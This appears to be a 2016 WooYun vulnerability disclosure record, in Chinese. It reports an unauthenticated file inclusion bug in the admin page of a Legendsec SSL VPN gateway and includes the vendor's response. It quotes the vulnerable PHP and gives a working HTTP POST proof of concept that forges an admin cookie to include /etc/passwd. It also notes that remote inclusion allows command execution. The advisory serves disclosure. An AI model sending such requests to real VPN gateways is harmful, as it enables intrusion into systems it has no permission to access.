{"id": 85949, "wybug_id": "wooyun-2016-0169734", "wybug_title": "网神某网关设备文件包含漏洞（无需登录可远程）", "wybug_corp": "网神信息技术(北京)股份有限公司", "wybug_author": "路人甲", "wybug_date": "2016-01-14 09:42", "wybug_open_date": "2016-04-11 16:08", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "文件包含漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向公众公开  简要描述： 现在，依然有很多人混淆文件读取和文件包含的概念 详细说明：  文件读取漏洞：用户可控的参数，进入file_get_contents..文件包含漏洞：用户可控的参数，进入include(_once)、require(_once)..网神SSL VPN系统的/admin/main.php文件，有如下代码：\nif (isset($_GET[\"skip\"])) {\tif (isset($_REQUEST[\"body\"])) {\t\tinclude_once \"menu_inc.php\";    \t\t$tmp_body = $_REQUEST[\"body\"];\t\tif ($BODY[$tmp_body][\"role\"] & $_COOKIE[\"admin_role\"]) {  \t  \t\tinclude_once $BODY[$tmp_body][\"file\"];\t\t} else {\t\t\t$RURL = \"main.php\";\t\t\t$msg = $MSG_INVAILD_ROLE;\t\t\tinclude_once \"include/error.php\";\t\t}\t\treturn;    \t}}\n重点关注下面的这一行：\ninclude_once $BODY[$tmp_body][\"file\"];\n参数$BODY[$tmp_body][\"file\"]进入了include函数，造成了文件包含漏洞，由于参数（$BODY[$tmp_body][\"file\"]）前没有其他的字符，故当allow_url_fopen=On并且 allow_url_include=On时，可远程包含任意文件，导致命令执行   漏洞证明：  该系统的使用量及重要性就不多说了，下面给出漏洞证明（包含本地文件/etc/passwd为例）0x00 **.**.**.**/welcome_pop.php (深圳公安局SSL VPN系统) \nPOST /admin/main.php?skip=1 HTTP/1.1Host: **.**.**.**Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; CIBA; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: admin_role=1Content-Type: application/x-www-form-urlencodedContent-Length: 57body=test&BODY[test][role]=1&BODY[test][file]=/etc/passwd\n\n\n漏洞大量存在，给几个案例：\n**.**.**.**/welcome_pop.phphttps://**.**.**.**/welcome_pop.php\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-01-19 09:28 厂商回复： 感谢白帽子的反馈，经过核实，网神早年旧版VPN的确存在PHP漏洞缺陷问题，网神新一代SSLVPN产品不受影响。由于现存的旧版VPN客户数量不多，网神内部会针对现存的旧版VPN客户逐一进行联系，提供系统升级或设备更换服务。请白帽子通过私信将收货地址发给网神，有一份礼物赠送！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}